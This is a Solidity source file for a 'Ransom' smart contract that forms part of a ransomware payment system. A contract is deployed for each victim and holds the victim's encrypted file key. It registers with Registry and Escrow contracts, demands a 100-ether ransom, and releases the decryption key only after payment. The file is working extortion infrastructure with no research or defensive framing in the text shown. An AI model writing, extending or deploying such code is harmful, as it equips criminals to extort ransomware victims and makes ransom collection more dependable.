pragma solidity ^0.4.24;

import "./Escrow.sol";
import "./Registry.sol";

///@title Ransom contract
contract Ransom {
    /**
     * @dev This is the Ransom contract that is deployed for each victim. It holds an encrypted
     * version of the key needed to decrypt the files on the victim machine. The only way to obtain a
     * copy of the decrypted key is for the victim to pay the ransom. Once the ransom has been paid, the
     * key may be retrieved through the getDecryptionKey() function.
     */

    uint victimId;          //!< The unique ID of the victim
    string encKey;          //!< The key (encrypted) being held ransom (needed to decrypt victim's files)        
    address victimAddr;     //!< The account address belonging to the victim
    uint constant RANSOMAMOUNT = 100 ether; //!< The ransom amount the victim must pay
    address escrowAddr;     //!< The address of the Escrow contract associated with this ransom
    address registryAddr;   //!< The address of the Registry contract
    bool authenticated;     //!< Indicates whether this contract has been authenticated with the Escrow
    bool fulfilled;         //!< Indicates whether the ransom has been fulfilled

    ///@dev The AuthFailEvent is triggered when a problem occurs authenticating with the Escrow contract
    event AuthFailEvent(
        uint id             //!< The unique ID of the victim
    );

    ///@dev Modifier used to restrict the caller to be the Escrow contract
    modifier restrictSenderToEscrow {
        require(msg.sender == escrowAddr, "Only the Escrow contract can call this");
        _;
    }

    ///@dev Modifier used to restrict the caller to be the Registry contract
    modifier restrictSenderToRegistry {
        require(msg.sender == registryAddr, "Only the Registry contract can call this");
        _;
    }

    ///@dev Modifier used to restrict the origin of the transaction to the victim's account
    modifier restrictSenderToVictim {
        require(msg.sender == victimAddr, "Only the Victim can call this");
        _;
    }

    ///@dev Modifier used to restrict calls to once this contract has been authenticated
    modifier onlyAuthenticated {
        require(authenticated == true, "Only valid if the Ransom contract has been authenticated");
        _;
    }

    /**
     * @dev Ransom constructor
     * @param _victimId Unique ID of the victim
     * @param _encKey The encrypted version of the key used to encrypt the victim's files
     * @param _victimAddr The account address of the victim
     * @param _registryAddr The address of the Registry contract
     * @param authToken The one-time authentication code used to authenticate this contract with the Registry
     */
    constructor(uint _victimId, string _encKey, address _victimAddr, address _registryAddr, uint authToken) public {
        authenticated = false;
        registryAddr = _registryAddr;
        escrowAddr = address(0);
        fulfilled = false;
        victimId = _victimId;
        encKey = _encKey;
        victimAddr = _victimAddr;

        // Call registry contract
        // If the call fails (i.e, too many in queue), then emit an AuthFailEvent
        bool result = Registry(registryAddr).registerVictim(victimId, authToken);
        if (result == false) {
            emit AuthFailEvent(victimId);
        }
    }

    /**
     * @dev Callback function from the Registry contract to indicate whether authentication was successful
     * @param authResult Indicates whether authentication succeeded    
     */
    function authCallback(address _escrowAddr, bool authResult) external restrictSenderToRegistry {
        authenticated = authResult;
        if (authResult == true){
            escrowAddr = _escrowAddr;

            // If authentication was successful, then register with the Escrow contract
            Escrow(escrowAddr).registerRansom(RANSOMAMOUNT, victimId, victimAddr);
        } else {
            emit AuthFailEvent(victimId);
        }
    }

    /**
     * @dev Gets the address of the Escrow contract
     * @return escrowAddr Address of Escrow contract
     */
    function getEscrowAddress() external view returns (address) {
        return escrowAddr;
    }

    /**
     * @dev This function may only be called by the Escrow contract. When the victim pays
     * the ransom into Escrow, then the Escrow contract will request a copy of the encryption
     * key to verify that it can successfully decrypt a file provided by the victim. This gives
     * the victim assurances that they will be given a valid key.
     */
    function requestKey() external onlyAuthenticated restrictSenderToEscrow {
        Escrow(escrowAddr).decryptKey(victimId, encKey);
    }

    /**
     * @dev The victim may call this function at any time to get a copy of the decryption key. Note that
     * the key is provided by the Escrow contract. It will return an empty string until they have payed
     * the ransom and the key provided by this contract has been successufully used to decrypt a file
     * provided by the victim. 
     * @return key The encryption key that may be used to decrypt their files (or empty string if ransom
     * has not been paid)
     */
    function getDecryptionKey() external onlyAuthenticated restrictSenderToVictim view returns (bytes32) {
        return Escrow(escrowAddr).getDecryptionKey(victimId);
    }
    
    /**
     * @dev This function may only be called by the Escrow contract to indicate that the ransom has been fulfilled.
     */
    function fulfillContract() external restrictSenderToEscrow onlyAuthenticated {
        fulfilled = true;
    }

    /**
     * @dev This function may be called by anyone to check if this contract has been authenticated.
     * @return authenticated Indicates whether the contract has succesfully authenticated with the Registry
     */
    function isAuthenticated() external view returns (bool) {
        return authenticated;
    }

    /**
     * @dev This function may be called by anyone to check if this contract has been fulfilled.
     * @return fulfilled Indicates whether the contract has been fulfilled.
     */
    function isFulFilled() external view returns (bool) {
        return fulfilled;
    }

    /**
     * @dev Self-dstructs this contract. May only be called by the Escrow contract
     */
    function die() external restrictSenderToEscrow onlyAuthenticated {
        selfdestruct(escrowAddr);
    }

}
